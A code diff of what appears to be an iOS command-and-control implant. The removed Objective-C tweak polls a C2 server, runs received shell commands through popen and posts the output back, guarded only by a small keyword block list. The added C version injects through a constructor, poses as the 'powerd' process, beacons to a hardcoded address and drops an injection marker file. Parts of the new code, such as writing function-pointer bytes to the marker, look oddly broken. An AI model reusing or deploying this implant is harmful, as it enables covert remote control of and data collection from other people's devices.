@@ -1,185 +1,156 @@
-// SpringBoardTweak.m
-#import <UIKit/UIKit.h>
-#import <Foundation/Foundation.h>
+@import Darwin;
+#include <time.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
 
-// ============ 配置 ============
-#define C2_HOST @"http://localhost:8888"
-#define C2_INTERVAL 3.0
+#define C2_SERVER_KEY  "__C2URL__"
 
-// ============ 全局变量 ============
-static NSString *deviceId = nil;
-static BOOL running = YES;
+static char *c2_server = NULL;
+static char *device_id = NULL;
+static volatile int running = 1;
 
-// ============ URL编码 ============
-NSString *urlEncode(NSString *s) {
-    return [s stringByAddingPercentEncodingWithAllowedCharacters:
-            [NSCharacterSet URLQueryAllowedCharacterSet]] ?: @"";
-}
+static void* (*_dlopen)(const char*, int);
+static int (*_close)(int);
+static int (*_open)(const char*, int, ...);
+static int (*_write)(int, const void*, size_t);
+static int (*_read)(int, void*, size_t);
+static pid_t (*_getpid)(void);
+static void* (*_memset)(void*, int, size_t);
+static void* (*_memcpy)(void*, const void*, size_t);
+static int (*_snprintf)(char*, size_t, const char*, ...);
+static int (*_strcmp)(const char*, const char*);
+static size_t (*_strlen)(const char*);
+static void* (*_malloc)(size_t);
+static void (*_free)(void*);
+static char* (*_strstr)(const char*, const char*);
+static char* (*_strchr)(const char*, int);
+static int (*_usleep)(useconds_t);
 
-// ============ HTTP GET ============
-NSData *httpGet(NSString *path) {
-    NSString *urlStr = [C2_HOST stringByAppendingString:path];
-    NSURL *url = [NSURL URLWithString:urlStr];
-    if (!url) return nil;
-    
-    NSURLRequest *req = [NSURLRequest requestWithURL:url
-                         cachePolicy:NSURLRequestReloadIgnoringCacheData
-                         timeoutInterval:10];
-    
-    __block NSData *result = nil;
-    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
-    
-    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(
-        NSData *data, NSURLResponse *resp, NSError *err) {
-        result = data;
-        dispatch_semaphore_signal(sem);
-    }] resume];
-    
-    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
-    return result;
-}
+static int http_request(const char *host, int port, const char *method,
+                        const char *path, const char *body, char *resp, size_t resp_size) {
+    struct sockaddr_in addr;
+    struct hostent *he;
+    char req[8192];
+    int sock;
 
-// ============ HTTP POST ============
-NSData *httpPost(NSString *path, NSDictionary *body) {
-    NSString *urlStr = [C2_HOST stringByAppendingString:path];
-    NSURL *url = [NSURL URLWithString:urlStr];
-    if (!url) return nil;
-    
-    NSData *json = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
-    if (!json) return nil;
-    
-    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
-    req.HTTPMethod = @"POST";
-    req.HTTPBody = json;
-    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-    req.timeoutInterval = 10;
-    
-    __block NSData *result = nil;
-    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
-    
-    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(
-        NSData *data, NSURLResponse *resp, NSError *err) {
-        result = data;
-        dispatch_semaphore_signal(sem);
-    }] resume];
-    
-    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
-    return result;
-}
+    _memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
 
-// ============ 获取设备ID ============
-NSString *getDeviceId() {
-    if (deviceId) return deviceId;
-    
-    // 读取缓存
-    NSString *cachePath = @"/tmp/.test_c2";
-    deviceId = [NSString stringWithContentsOfFile:cachePath encoding:NSUTF8StringEncoding error:nil];
-    if (deviceId) return deviceId;
-    
-    // 生成新ID
-    NSString *uuid = [[[UIDevice currentDevice] identifierForVendor] UUIDString] ?: @"unknown";
-    deviceId = [NSString stringWithFormat:@"test_%@", uuid];
-    [deviceId writeToFile:cachePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
-    
-    return deviceId;
-}
+    if ((he = gethostbyname(host)) == NULL) return -1;
+    _memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
 
-// ============ 执行命令（使用popen，iOS兼容）============
-NSString *executeCommand(NSString *cmd) {
-    if (!cmd || cmd.length == 0) return @"";
-    
-    // 安全检查
-    NSArray *dangerous = @[@"|", @";", @"&&", @"`", @"$(", @"rm ", @"sudo", @"dd "];
-    for (NSString *d in dangerous) {
-        if ([cmd containsString:d]) {
-            return @"[REJECTED] Dangerous command";
-        }
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return -1;
+
+    struct timeval tv = {5, 0};
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        _close(sock);
+        return -1;
     }
-    
-    FILE *fp = popen([cmd UTF8String], "r");
-    if (!fp) return @"popen failed";
-    
-    NSMutableString *out = [NSMutableString string];
-    char buf[4096];
-    int total = 0;
-    
-    while (fgets(buf, sizeof(buf), fp)) {
-        total += strlen(buf);
-        if (total > 1024 * 512) {
-            [out appendString:@"\n... truncated"];
-            break;
-        }
-        [out appendFormat:@"%s", buf];
+
+    size_t blen = body ? _strlen(body) : 0;
+    int n = _snprintf(req, sizeof(req),
+        "%s %s HTTP/1.0\r\n"
+        "Host: %s\r\n"
+        "Content-Type: application/json\r\n"
+        "Content-Length: %zu\r\n"
+        "Connection: close\r\n"
+        "\r\n"
+        "%s",
+        method, path, host, blen, body ? body : "");
+
+    _write(sock, req, n);
+
+    size_t total = 0;
+    int r;
+    while (total < resp_size - 1 && (r = _read(sock, resp + total, resp_size - total - 1)) > 0) {
+        total += r;
     }
-    
-    int rc = pclose(fp);
-    [out appendFormat:@"\n[exit: %d]", rc];
-    return out.length > 0 ? out : @"(no output)";
+    resp[total] = 0;
+    _close(sock);
+    return 0;
 }
 
-// ============ 签到 ============
-void checkin() {
-    NSString *path = [NSString stringWithFormat:@"/api/checkin?id=%@&v=%@&proc=%@&pid=%d",
-                     urlEncode(getDeviceId()),
-                     urlEncode([[UIDevice currentDevice] systemVersion] ?: @"?"),
-                     urlEncode(@"SpringBoard"),
-                     getpid()];
-    httpGet(path);
-}
+static void checkin(void) {
+    if (!c2_server || !device_id) return;
 
-// ============ 轮询命令 ============
-void pollCommands() {
-    NSString *path = [NSString stringWithFormat:@"/api/commands?id=%@", urlEncode(getDeviceId())];
-    NSData *data = httpGet(path);
-    if (!data) return;
-    
-    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
-    if (!json) return;
-    
-    NSArray *commands = json[@"commands"];
-    if (!commands || commands.count == 0) return;
-    
-    for (NSDictionary *cmd in commands) {
-        NSString *cmdId = cmd[@"id"] ?: @"?";
-        NSString *cmdText = cmd[@"cmd"];
-        if (!cmdText) continue;
-        
-        NSString *output = executeCommand(cmdText);
-        
-        httpPost(@"/api/result", @{
-            @"id": getDeviceId(),
-            @"cmd_id": cmdId,
-            @"output": output
-        });
+    char host[256] = {0};
+    int port = 8888;
+    char *colon = _strchr(c2_server, ':');
+    if (colon) {
+        _snprintf(host, colon - c2_server + 1, "%s", c2_server);
+        port = atoi(colon + 1);
+    } else {
+        _snprintf(host, sizeof(host), "%s", c2_server);
     }
+
+    char body[1024];
+    _snprintf(body, sizeof(body),
+        "{\"id\":\"%s\",\"proc\":\"powerd\",\"pid\":%d}",
+        device_id, _getpid());
+
+    char resp[4096];
+    http_request(host, port, "POST", "/api/checkin", body, resp, sizeof(resp));
 }
 
-// ============ 主循环 ============
-void agentLoop() {
+static void* agent_main(void *arg) {
+    _usleep(500000);
     checkin();
-    
-    // Proof of life
-    NSString *pol = executeCommand(@"id");
-    httpPost(@"/api/result", @{
-        @"id": getDeviceId(),
-        @"cmd_id": @"proof_of_life",
-        @"output": pol
-    });
-    
+
     while (running) {
-        @autoreleasepool {
-            pollCommands();
+        int i;
+        for (i = 0; i < 10 && running; i++) {
+            _usleep(1000000);
         }
-        [NSThread sleepForTimeInterval:C2_INTERVAL];
+        checkin();
     }
+    return NULL;
 }
 
-// ============ 使用Theos的%ctor入口 ============
-%ctor {
-    @autoreleasepool {
-        // 在后台线程运行C2代理
-        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-            agentLoop();
-        });
+__attribute__((constructor)) static void init(void) {
+    _dlopen = dlopen;
+    _close = close;
+    _open = open;
+    _write = write;
+    _read = read;
+    _getpid = getpid;
+    _memset = memset;
+    _memcpy = memcpy;
+    _snprintf = snprintf;
+    _strcmp = strcmp;
+    _strlen = strlen;
+    _malloc = malloc;
+    _free = free;
+    _strstr = strstr;
+    _strchr = strchr;
+    _usleep = usleep;
+
+    c2_server = C2_SERVER_KEY;
+    if (_strcmp(c2_server, "__C2" "URL__") == 0) {
+        c2_server = "192.168.36.253:8888";
     }
+
+    char idbuf[64];
+    _snprintf(idbuf, sizeof(idbuf), "pwr_%d_%d", _getpid(), (int)time(NULL));
+    device_id = _malloc(_strlen(idbuf) + 1);
+    if (device_id) {
+        _snprintf(device_id, _strlen(idbuf) + 1, "%s", idbuf);
+    }
+
+    // Marker file to confirm injection
+    char marker[128];
+    _snprintf(marker, sizeof(marker), "/tmp/.coruna_injected_%d", _getpid());
+    int fd = _open(marker, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+    if (fd >= 0) {
+        _write(fd, agent_main, 8);
+        _close(fd);
+    }
+
+    agent_main(NULL);
 }
